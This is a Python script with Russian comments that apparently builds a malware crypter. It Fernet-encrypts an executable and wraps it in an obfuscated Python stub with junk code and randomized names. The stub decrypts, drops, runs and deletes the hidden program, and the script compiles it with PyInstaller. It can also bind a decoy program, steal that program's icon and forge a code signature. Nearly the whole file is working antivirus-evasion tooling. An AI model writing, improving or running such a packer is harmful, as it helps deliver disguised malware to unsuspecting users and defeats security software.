from cryptography.fernet import Fernet
import os
import shutil
import random
import string
import win32api
import win32con
import win32gui
import win32ui



def generate_random_string(length):
    characters = string.ascii_letters + string.digits #+ string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))
def generate_random_digit(min, max):
    return random.randint(min, max)
def extract_icon(exe_path, output_path):
    try:
        # Получаем дескриптор иконки из файла .exe
        hicon = win32gui.ExtractIcon(win32api.GetModuleHandle(None), exe_path, 0)

        # Создаем контекст устройства для работы с изображением
        hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
        hbmp = win32ui.CreateBitmap()
        hbmp.CreateCompatibleBitmap(hdc, 32, 32)
        hdc = hdc.CreateCompatibleDC()

        # Связываем иконку с контекстом устройства
        hdc.SelectObject(hbmp)
        hdc.DrawIcon((0, 0), hicon)

        # Сохраняем изображение в файл .ico
        hbmp.SaveBitmapFile(hdc, output_path)

        # Освобождаем ресурсы
        win32gui.DestroyIcon(hicon)
        hdc.DeleteDC()
        win32gui.DeleteObject(hbmp.GetHandle())

        print("Иконка успешно сохранена в", output_path)
        return output_path
    except Exception as e:
        print("Произошла ошибка при извлечении иконки:", e)




source = input(str(r'path to .exe: '))
iconpacked = input(str(r'path to .ico: '))
morphing = input(str('morph with other program? y/n: '))
if morphing == 'y':
    morphingsource = input(str(r'path to .exe: '))
    iconpacked = extract_icon(morphingsource, "build.ico")
else: 
    morphingsource =''
MUTEXBYTES = generate_random_string(generate_random_digit(16, 32))
MUTEXDELAY = generate_random_digit(1, 10)
MUTEX = f'SIMPLECRYPT_OS{MUTEXBYTES}'
MUTEXTRASHBYTES = generate_random_string(generate_random_digit(30120, 40960))

def morphpayload(morphingsource, MUTEXBYTES):
    if morphing == 'y':
        a = generate_random_digit(0, 3)
        payload = [f'print("{MUTEXBYTES}")'] * 5
        
        with open(f'{morphingsource}', 'rb') as f:
            exe_bytes = f.read()

        payload1 = f'''
def p{MUTEXBYTES}o{MUTEXBYTES}p{MUTEXBYTES}():
    with open('M{MUTEXBYTES}.exe', 'wb') as f{MUTEXBYTES}{MUTEXBYTES}:
        time.sleep({MUTEXDELAY})
        f{MUTEXBYTES}{MUTEXBYTES}.write({exe_bytes})
    os.system("M{MUTEXBYTES}.exe")
    os.remove("M{MUTEXBYTES}.exe")'''
        if a == 0:
            payload[1] = payload1
        elif a == 1:
            payload[2] = payload1
        elif a == 2:  # Если a == 2
            payload[3] = payload1
        else:
            payload[4] = payload1
        return payload
    else:
        return ' '

print("MUTEX - ", MUTEX)
def randomimports():
    impo0rts = ['from cryptography.fernet import Fernet', 'import os', 'import time', 'import random']
    random.shuffle(impo0rts)
    return impo0rts
def packof(MUTEXBYTES):
    a1 = f'''
def a{MUTEXBYTES}1{MUTEXBYTES}():
    return {sum(random.randint(1, 100) for _ in range(random.randint(1, 10)))}
a{MUTEXBYTES}1{MUTEXBYTES}()
'''
    a2 = f'''
def a{MUTEXBYTES}2{MUTEXBYTES}():
    try:
        return 10 / 0
    except Exception:
        print('{MUTEXBYTES}')
a{MUTEXBYTES}2{MUTEXBYTES}()
'''
    a3 = f'''
def a{MUTEXBYTES}3{MUTEXBYTES}():
    print('{chr(random.randint(97, 122))}')
a{MUTEXBYTES}3{MUTEXBYTES}()
'''
    a4 = f'''
def a{MUTEXBYTES}4{MUTEXBYTES}():
    import os
    f{MUTEXBYTES}il{MUTEXBYTES}es = os.listdir('.')
    print(f{MUTEXBYTES}il{MUTEXBYTES}es)
a{MUTEXBYTES}4{MUTEXBYTES}()
'''
    a5 = f'''
def a{MUTEXBYTES}5{MUTEXBYTES}():
    return {[[random.randint(1, 100) for _ in range(3)] for _ in range(3)]}
a{MUTEXBYTES}5{MUTEXBYTES}()
'''
    a6 = f'''
def a{MUTEXBYTES}6{MUTEXBYTES}():
    try:
        with open('n{MUTEXBYTES}on_{MUTEXBYTES}exi{MUTEXBYTES}ste{MUTEXBYTES}nt_fil{MUTEXBYTES}e.txt', 'r') as f{MUTEXBYTES}:
            print(f{MUTEXBYTES}.read())
    except Exception:
        print('{MUTEXBYTES}')
a{MUTEXBYTES}6{MUTEXBYTES}()
'''
    a7 = f'''
def a{MUTEXBYTES}8():
    try:
        x{MUTEXBYTES} = 10
        x{MUTEXBYTES}.some_{MUTEXBYTES}nonexis{MUTEXBYTES}tent_{MUTEXBYTES}method()
    except Exception:
        print('{MUTEXBYTES}')
a{MUTEXBYTES}8()
'''
    a8 = f'''
def a{MUTEXBYTES}9{MUTEXBYTES}():
    m{MUTEXBYTES}y_l{MUTEXBYTES}ist = [5, 3, 8, 1, 2]
    return m{MUTEXBYTES}y_l{MUTEXBYTES}ist
a{MUTEXBYTES}9{MUTEXBYTES}()
'''
    a9 = f'''
def a{MUTEXBYTES}10{MUTEXBYTES}():
    try:
        return (-5*0)
    except Exception:
        print('{MUTEXBYTES}')
a{MUTEXBYTES}10{MUTEXBYTES}()
'''
    a10 = f'''
def a{MUTEXBYTES}1{MUTEXBYTES}1{MUTEXBYTES}():
    try:
        s{MUTEXBYTES}oc{MUTEXBYTES}k = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s{MUTEXBYTES}oc{MUTEXBYTES}k.connect(('non_exi{MUTEXBYTES}ste{MUTEXBYTES}nt_host.com', 80))
    except Exception:
        print('{MUTEXBYTES}')
a{MUTEXBYTES}1{MUTEXBYTES}1{MUTEXBYTES}()
'''
    a11 = f'''
def a{MUTEXBYTES}1{MUTEXBYTES}2{MUTEXBYTES}():
    try:
        m{MUTEXBYTES}etho{MUTEXBYTES}d = random.choice(['GET', 'POST', 'PUT', 'DELETE'])
        u{MUTEXBYTES}r{MUTEXBYTES}l = 'http://exa{MUTEXBYTES}mple.com'
        r{MUTEXBYTES}espons{MUTEXBYTES}e = requests.request(m{MUTEXBYTES}etho{MUTEXBYTES}d, u{MUTEXBYTES}r{MUTEXBYTES}l)
        return r{MUTEXBYTES}espons{MUTEXBYTES}e.status_code
    except Exception:
        print('{MUTEXBYTES}')
a{MUTEXBYTES}1{MUTEXBYTES}2{MUTEXBYTES}()
'''
    a12 = f'''
def a{MUTEXBYTES}1{MUTEXBYTES}5():
    try:
        co{MUTEXBYTES}nn = sqlite3.connect('no{MUTEXBYTES}n_exist{MUTEXBYTES}ent_databa{MUTEXBYTES}se.db')
        cu{MUTEXBYTES}rsor = co{MUTEXBYTES}nn.cursor()
        cu{MUTEXBYTES}rsor.execute("SELECT * FROM no{MUTEXBYTES}n_exist{MUTEXBYTES}ent_tab{MUTEXBYTES}le")
        ro{MUTEXBYTES}ws = cu{MUTEXBYTES}rsor.fetchall()
        co{MUTEXBYTES}nn.close()
        return ro{MUTEXBYTES}ws
    except Exception:
        print('{MUTEXBYTES}')
a{MUTEXBYTES}1{MUTEXBYTES}5()
'''
    a13 = f'''
def e{MUTEXBYTES}():
    d{MUTEXBYTES}s{MUTEXBYTES}a = os.cpu_count
    p{MUTEXBYTES}o{MUTEXBYTES}s = 1 * 8 * 7567 * 3 * 43
    print(p{MUTEXBYTES}o{MUTEXBYTES}s, d{MUTEXBYTES}s{MUTEXBYTES}a) 
e{MUTEXBYTES}()
'''
    a14 = f'''
def t{MUTEXBYTES}():
    print(os.listdir)
    os.mkdir("a{MUTEXBYTES}sd{MUTEXBYTES}as")
    os.rmdir("a{MUTEXBYTES}sd{MUTEXBYTES}as")
t{MUTEXBYTES}()
'''
    arrayofpayload = [a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14]
    random_payload = random.sample(arrayofpayload, 7)
    # Объединяем с обязательными функциями и возвращаем
    return random_payload

def select_random_entry_points(MUTEXBYTES):
    payload = [f'print("{MUTEXBYTES}")'] * 5
    a = generate_random_digit(0, 3)
    b1 = f'''
with open('{MUTEXBYTES}.exe', 'wb') as f{MUTEXBYTES}{MUTEXBYTES}:
    time.sleep({MUTEXDELAY})
    f{MUTEXBYTES}{MUTEXBYTES}.write(B{MUTEXBYTES}Y{MUTEXBYTES}T{MUTEXBYTES}E{MUTEXBYTES}S)
'''
    b2 = f'''
os.system("{MUTEXBYTES}.exe")
os.remove("{MUTEXBYTES}.exe")
'''
    if a == 0:
        payload[0] = b1
        payload[1] = b2
    elif a == 1:
        payload[1] = b1
        payload[2] = b2
    elif a == 2:  # Если a == 2
        payload[2] = b1
        payload[3] = b2
    else:
        payload[3] = b1
        payload[4] = b2
    return payload

def bonespack(MUTEX, CRYPTED_BYTES, ENCRYPT_KEY):
    spayload = packof(MUTEX)
    npayload = select_random_entry_points(MUTEX)
    impo0rts = randomimports()
    if morphing == 'y':
        mpayload = morphpayload(morphingsource, MUTEX)
    else: 
        mpayload = [f'print("{MUTEXBYTES}")',f'print("{MUTEXBYTES}")',f'print("{MUTEXBYTES}")',f'print("{MUTEXBYTES}")',f'print("{MUTEXBYTES}")',]
    BONES = f'''
{impo0rts[0]}
{impo0rts[1]}
{impo0rts[2]}
{impo0rts[3]}
time.sleep({MUTEXDELAY})
{spayload[5]}
B{MUTEXBYTES}Y{MUTEXBYTES}T{MUTEXBYTES}E{MUTEXBYTES}S = {CRYPTED_BYTES}
K{MUTEXBYTES}E{MUTEXBYTES}Y = {ENCRYPT_KEY}
{spayload[6]}
c{MUTEXBYTES}i{MUTEXBYTES}p{MUTEXBYTES}h{MUTEXBYTES}e{MUTEXBYTES}r = Fernet(K{MUTEXBYTES}E{MUTEXBYTES}Y)
B{MUTEXBYTES}Y{MUTEXBYTES}T{MUTEXBYTES}E{MUTEXBYTES}S = c{MUTEXBYTES}i{MUTEXBYTES}p{MUTEXBYTES}h{MUTEXBYTES}e{MUTEXBYTES}r.decrypt(B{MUTEXBYTES}Y{MUTEXBYTES}T{MUTEXBYTES}E{MUTEXBYTES}S)
{spayload[0]}
{npayload[0]}
{mpayload[0]}
{spayload[1]}
{npayload[1]}
{mpayload[1]}
{spayload[2]}
{npayload[2]}
{mpayload[2]}
{spayload[3]}
{npayload[3]}
{mpayload[3]}
{spayload[4]}
{npayload[4]}
{mpayload[4]}
p{MUTEXBYTES}o{MUTEXBYTES}p{MUTEXBYTES}()
'''
    return(BONES)

def cryptor_exe(source):
    file = "crypted.exe"
    with open(f'{source}', 'rb') as f:
        exe_bytes = f.read()
    key = Fernet.generate_key()
    cipher = Fernet(key)
    encrypted_exe = cipher.encrypt(exe_bytes)
    with open(file, 'wb') as f:
        f.write(encrypted_exe)
    print(f"Файл {file} успешно зашифрован.")
    print("Ключ для расшифровки:", key)
    return[key, file]
def pack(key, crypted):
    with open(crypted, "rb") as file:
        file_content = file.read()
    with open("packed.pyw", "w") as new_file:
        ALGO = bonespack(MUTEXBYTES, file_content, key)
        new_file.write(ALGO)
        os.remove(crypted)
        print("File packed")
def setsig(morphingsource, Build):
    os.system(f'py AutoCert.py -i {morphingsource} -t {Build} -o SIGNED{Build}')
def compile(morphingsource):
    os.system(f"pyinstaller --onefile --icon={iconpacked} packed.pyw")
    current_directory = os.getcwd()
    shutil.move(r"dist\packed.exe", current_directory)
    shutil.rmtree("dist")
    shutil.rmtree("build")
    os.remove("packed.pyw")
    os.remove("packed.spec")
    Build = f"Build-{MUTEX}.exe"
    os.rename("packed.exe", Build)
    if morphing == 'y':
        setsig(morphingsource, Build)
        os.remove("build.ico")
        os.remove(Build)
    print("Файл успешно закриптован")
cryptod = cryptor_exe(source)
pack(cryptod[0], cryptod[1])
compile(morphingsource)
